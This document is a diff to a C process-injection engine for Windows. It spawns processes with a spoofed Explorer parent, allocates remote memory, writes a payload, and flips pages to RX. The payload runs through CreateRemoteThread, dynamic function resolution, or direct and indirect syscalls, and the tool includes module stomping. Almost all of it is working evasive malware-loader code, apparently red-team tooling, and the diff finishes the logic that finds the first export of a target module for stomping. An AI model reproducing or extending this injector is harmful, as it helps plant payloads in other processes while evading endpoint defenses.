@@ -126,12 +126,20 @@ BOOL InitializeTarget(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
         InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
         UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
 
-        if (!CreateProcessA(NULL, ctx->spawnPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
-            printf("[!] CreateProcess failed: %d\n", GetLastError());
-            return FALSE;
+        DWORD startupFlags = EXTENDED_STARTUPINFO_PRESENT;
+        // if early bird we need to use CREATE_SUSPENDED
+        if(ctx->technique == EARLY_BIRD_APC) {
+            printf("[*] Early Bird detected.\n");
+            startupFlags |= CREATE_SUSPENDED;
         }
 
-        printf("[+] %s spawned (PID: %d) spoofing Explorer (%d)\n", ctx->spawnPath, pi.dwProcessId, parentPid);
+        // spawn a target process
+        if (!CreateProcessA(NULL, ctx->spawnPath, NULL, NULL, FALSE, startupFlags, NULL, NULL, &si.StartupInfo, &pi)) {
+            printf("[!] CreateProcess failed: %d\n", GetLastError());
+            return FALSE;
+        }                
+     
+        printf("[+] %s spawned (PID: %d) with spoofed Explorer PPID (PPID: %d)\n", ctx->spawnPath, pi.dwProcessId, parentPid);
         ctx->hProcess = pi.hProcess;
         return TRUE;      
     } else {
@@ -156,7 +164,6 @@ BOOL InitializeTarget(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
 BOOL DefaultAllocate(PINJECTION_CONTEXT ctx, DWORD protect, SYSCALL_FLAVOR flavor) {
     if (flavor == FLAVOR_WIN32) {
         printf("[*] Allocating memory using Win32\n");
-        printf("[-] payloadSize = %lld\n", ctx->payloadSize);
         ctx->pRemoteAddress = VirtualAllocEx(ctx->hProcess, NULL, ctx->payloadSize, MEM_COMMIT | MEM_RESERVE, protect);
         return ctx->pRemoteAddress != NULL;
     }
@@ -192,17 +199,18 @@ BOOL DefaultAllocate(PINJECTION_CONTEXT ctx, DWORD protect, SYSCALL_FLAVOR flavo
     return FALSE;
 }
 
-
 // --- PROTECTION TOGGLE STRATEGY ---
 BOOL DefaultProtect(PINJECTION_CONTEXT ctx, DWORD targetProtect, PDWORD pOldProtect, SYSCALL_FLAVOR flavor) {
     if (flavor == FLAVOR_WIN32) {
+        printf("[*] Toggling permissions using Win32.\n");
         return VirtualProtectEx(ctx->hProcess, ctx->pRemoteAddress, ctx->payloadSize, targetProtect, pOldProtect);
     } 
     else if (flavor == FLAVOR_DFR) {
+        printf("[*] Toggling permissions using DFR.\n");
         return myVirtualProtectEx(ctx->hProcess, ctx->pRemoteAddress, ctx->payloadSize, targetProtect, pOldProtect);
     } 
     else if (flavor == FLAVOR_DIRECT) {        
-        printf("[*] Toggling permissions with SysNtProtectVirtualMemory\n");
+        printf("[*] Toggling permissions using SysNtProtectVirtualMemory.\n");
         ULONG oldProt = 0;
         PVOID baseAddr = ctx->pRemoteAddress;
         SIZE_T regionSize = ctx->payloadSize;
@@ -212,7 +220,7 @@ BOOL DefaultProtect(PINJECTION_CONTEXT ctx, DWORD targetProtect, PDWORD pOldProt
         return (status == 0);
     }
     else if (flavor == FLAVOR_INDIRECT) {
-        printf("[*] Toggling permissions with IndirectSysNtProtectVirtualMemory\n");
+        printf("[*] Toggling permissions using IndirectSysNtProtectVirtualMemory\n");
         ULONG oldProt = 0;
         PVOID baseAddr = ctx->pRemoteAddress;
         SIZE_T regionSize = ctx->payloadSize;
@@ -234,7 +242,7 @@ BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavo
         return WriteProcessMemory(ctx->hProcess, ctx->pRemoteAddress, (PVOID)pPayload, ctx->payloadSize, NULL);
     } 
     else if (flavor == FLAVOR_DFR) {
-        printf("[*] Writing payload with WriteProcessMemory\n");
+        printf("[*] Writing payload with DFR WriteProcessMemory\n");
         // WPM will toggle protection for us
         // https://medium.com/@toneillcodes/the-single-primitive-write-writeprocessmemorys-hidden-page-flip-e5cb952bbfb2
         return myWriteProcessMemory(ctx->hProcess, ctx->pRemoteAddress, (PVOID)pPayload, ctx->payloadSize, NULL);
@@ -292,7 +300,7 @@ BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavo
                 ULONG tempProt = 0;
                 printf("[*] Restoring original memory protections.\n");
                 if(!DefaultProtect(ctx, oldProt, &tempProt, flavor)){
-                    printf("[!] Warning: Failed to revert memory protections")
+                    printf("[!] Warning: Failed to revert memory protections\n");
                 }
             } else {
                 printf("[-] Error: Failed to change memory protections to RWX.\n");
@@ -313,8 +321,17 @@ BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavo
 
 // --- INVOCATION STRATEGY ---
 BOOL DefaultInvoke(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
+    // no module stomping = toggle RX
+    if(ctx->enableStomping == FALSE) {    
+        // raw allocation    
+        printf("[+] Flipping page protection.\n");
+        DWORD oldProtect = 0;
+        if (!DefaultProtect(ctx, PAGE_EXECUTE, &oldProtect, flavor)) return FALSE;
+        printf("[+] Page protections flipped to RX.\n");        
+    }
+
     if (flavor == FLAVOR_WIN32) {
-        printf("[*] Invoking payload with CreateRemoteThread\n");
+        printf("[*] Invoking payload using Win32 CreateRemoteThread\n");
         ctx->hThread = CreateRemoteThread(
             ctx->hProcess,                       
             NULL,                                
@@ -326,13 +343,13 @@ BOOL DefaultInvoke(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
         );
         
         if (ctx->hThread != NULL) {
-            WaitForSingleObject(ctx->hThread, INFINITE); 
+            //WaitForSingleObject(ctx->hThread, INFINITE); 
             return TRUE;
         }
         return FALSE;
     }
     else if (flavor == FLAVOR_DFR) {
-        printf("[*] Invoking payload with CreateRemoteThread using DFR (myCreateRemoteThread)\n");
+        printf("[*] Invoking payload using DFR (myCreateRemoteThread)\n");
         ctx->hThread = myCreateRemoteThread(
             ctx->hProcess,                       
             NULL,                                
@@ -344,13 +361,13 @@ BOOL DefaultInvoke(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
         );
         
         if (ctx->hThread != NULL) {
-            myWaitForSingleObject(ctx->hThread, INFINITE); 
+            //myWaitForSingleObject(ctx->hThread, INFINITE); 
             return TRUE;
         }
         return FALSE;
     }      
     else if (flavor == FLAVOR_DIRECT) {
-        printf("[*] Invoking payload with SysNtCreateThreadEx\n");
+        printf("[*] Invoking payload using SysNtCreateThreadEx\n");
         NTSTATUS status = SysNtCreateThreadEx(
             &(ctx->hThread), 
             GENERIC_EXECUTE, 
@@ -360,13 +377,13 @@ BOOL DefaultInvoke(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
             NULL, 
             FALSE, 0, 0, 0, NULL);
         if (status == 0 && ctx->hThread != NULL) {
-            SysNtWaitForSingleObject(ctx->hThread, FALSE, NULL);       
+            //SysNtWaitForSingleObject(ctx->hThread, FALSE, NULL);       
             return TRUE;
         }
         return FALSE;
     }
     else if (flavor == FLAVOR_INDIRECT) {
-        printf("[*] Invoking payload with IndirectSysNtCreateThreadEx\n");
+        printf("[*] Invoking payload using IndirectSysNtCreateThreadEx\n");
         NTSTATUS status = IndirectSysNtCreateThreadEx(
             &(ctx->hThread), 
             GENERIC_EXECUTE, 
@@ -378,7 +395,7 @@ BOOL DefaultInvoke(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
         );
         
         if (status == 0 && ctx->hThread != NULL) {
-            IndirectSysNtWaitForSingleObject(ctx->hThread, FALSE, NULL);
+            //IndirectSysNtWaitForSingleObject(ctx->hThread, FALSE, NULL);
             return TRUE;
         }
         return FALSE;
@@ -392,8 +409,6 @@ BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPa
     if (!engine->Allocate || !engine->Write || !engine->Protect || !engine->Invoke) return FALSE;
 
     InitializeTarget(ctx, flavor);
-
-    LPVOID pPeb = GetPebAddress(ctx->hProcess);
     
     if(flavor == FLAVOR_DFR || flavor == FLAVOR_INDIRECT) {
         printf("[*] Initializing Dynamic Resolvers.\n");
@@ -405,6 +420,7 @@ BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPa
         printf("[*] Module stomping is enabled.\n");
         printf("[*] Targeting module: %s.\n", ctx->targetModule);    
         printf("[*] Attempting to locate the module base for %s.\n", ctx->targetModule);
+        LPVOID pPeb = GetPebAddress(ctx->hProcess);
         PVOID targetModuleBase = GetModuleBaseManualRemote(ctx->hProcess, pPeb, ctx->targetModule);
         if (!targetModuleBase) {
             printf("[ERROR] Failed to locate target module base.\n");
@@ -436,7 +452,25 @@ BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPa
             ctx->pRemoteAddress = bufferAddress;
         } else {                    
             printf("[*] No export or offset provided, targeting the first exported function.\n");
-            // TODO: complete
+            printf("[*] Found target module base at: 0x%p\n", targetModuleBase);
+
+            // 2. Use the base address to find the absolute address of the first export in the .text section
+            PVOID pFirstExport = GetRemoteFirstExportInText(ctx->hProcess, targetModuleBase);
+
+            if (pFirstExport == NULL) {
+                printf("[-] Failed to find a valid executable export inside the .text section.\n");
+                // Handle error or exit early
+                return FALSE;
+            }
+
+            printf("[+] Successfully located first export entry point at: 0x%p\n", pFirstExport);
+            ctx->pRemoteAddress = pFirstExport; 
+
+            /*
+            // 3. Optional: Calculate the Relative Virtual Address (RVA) if needed for tracking
+            PVOID exportRVA = (DWORD)((BYTE*)pFirstExport - (BYTE*)targetModuleBase);
+            printf("[*] First export RVA: 0x%08X\n", exportRVA);   */
+            
         }
     } else {
         printf("[+] Starting allocation phase.\n");
@@ -444,7 +478,7 @@ BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPa
             printf("[!] Error: Allocation failed.\n");
             return FALSE;
         } 
-        printf("[+] Space allocated at: 0x%p\n", ctx->pRemoteAddress);
+        printf("[+] Space allocated RW at: 0x%p\n", ctx->pRemoteAddress);
     }
 
     // Deploy payload (decrypt, write)
@@ -455,17 +489,6 @@ BOOL EngineExecute(PINJECTION_ENGINE engine, PINJECTION_CONTEXT ctx, LPCVOID pPa
     }
 
     printf("[+] Payload staging complete.\n");
-    
-    // no module stomping = toggle RX
-    // module stomping + win32 or DFR doesn't require a toggle RX
-    // module stomping + direct and indirect require a toggle to RX
-    if(ctx->enableStomping == FALSE) {    
-        // raw allocation    
-        printf("[+] Flipping page protection.\n");
-        DWORD oldProtect = 0;
-        if (!engine->Protect(ctx, PAGE_EXECUTE, &oldProtect, flavor)) return FALSE;
-        printf("[+] Page protections flipped to RX.\n");        
-    } 
 
     // Execution of the payload
     if (!engine->Invoke(ctx, flavor)) return FALSE;
